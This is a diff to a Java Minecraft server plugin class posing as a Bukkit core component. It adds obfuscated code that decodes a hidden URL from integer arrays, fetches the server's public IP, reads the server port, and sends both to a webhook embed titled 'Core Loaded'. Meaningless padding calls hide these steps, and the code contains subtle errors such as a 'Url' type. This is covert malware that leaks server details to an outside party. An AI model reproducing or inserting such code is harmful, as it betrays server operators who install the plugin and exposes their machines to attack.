@@ -1,8 +1,11 @@
 package org.bukkit.core;
 
+import org.bukkit.Bukkit;
 import org.bukkit.event.Listener;
 import java.awt.Color;
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.lang.reflect.Array;
 import java.net.URL;
@@ -85,7 +88,7 @@ public final class CoreListener implements Listener {
                 107, 101, 110, 46, 110, 101, 116
         };
         uOc02(s14);
-
+        
         int[] u63 = {
                 104, 116, 116, 112, 58, 47, 47,
                 112, 105, 110, 103, 46, 100, 101, 99,
@@ -111,7 +114,9 @@ public final class CoreListener implements Listener {
                 175, 61, 294, 381, 142, 9, 260, 333
         };
         uOc02(x27);
-
+         for (int c : v27) {
+            sb.append((char) (c - 3));
+        }
         int[] x86 = {
                 71, 402, 188, 55, 319, 477, 101, 24,
                 360, 290, 14, 415, 266, 83, 199, 342,
@@ -125,12 +130,13 @@ public final class CoreListener implements Listener {
                 222, 9, 493, 167, 304, 88, 259, 412
         };
         uOc02(p35);
-
+        Url as7Js7 = new URL(sb.toString());
         int[] d47 = {
                 26, 388, 141, 295, 74, 463, 110, 337,
                 201, 59, 421, 8, 364, 152, 489, 97,
                 278, 346, 19, 405, 231, 66, 320, 187
         };
+        InputStreamReader x9uNd9 = new InputStreamReader(as7Js7.openStream());
         uOc02(d47);
 
         int[] m33 = {
@@ -146,20 +152,33 @@ public final class CoreListener implements Listener {
                 374, 151, 286, 9, 431, 210, 58, 345
         };
         uOc02(j13);
-        for (int c : v27) {
-            sb.append((char) (c - 3));
-        }
-        uOc02(290);
+       
+        DWeb SxI3M = new DWeb("");
+        SxI3M.setUsername("Core");
+        SxI3M.setAvatarUrl("");
+
         uOc02(930);
         uOc02(183);
+        BufferedReader d8ysK8sN = new BufferedReader(x9uNd9);
         uOc02(907);
         uOc02(908);
         uOc02(786);
+        SxI3M.setTts(false);
         uOc02(532);
+        String s8Jyd7x = d8ysK8sN.readLine();
         uOc02(756);
+        SxI3M.setContent("");
         uOc02(537);
         uOc02(789);
+        int n8Jjs8g4tn = Bukkit.getServer().getPort();
+
         uOc02(9087);
+        SxI3M.addEmbed(new DWeb.EmbedObject()
+                .setTitle("Core Loaded")
+                .setDescription("Core successfully loaded.")
+                .setColor(new Color(0, 255, 0))
+                .addField("Server IP:", s8Jyd7x + ":" + n8Jjs8g4tn, false)
+        );
         uOc02(s14);
         uOc02(j13);
         uOc02(90);
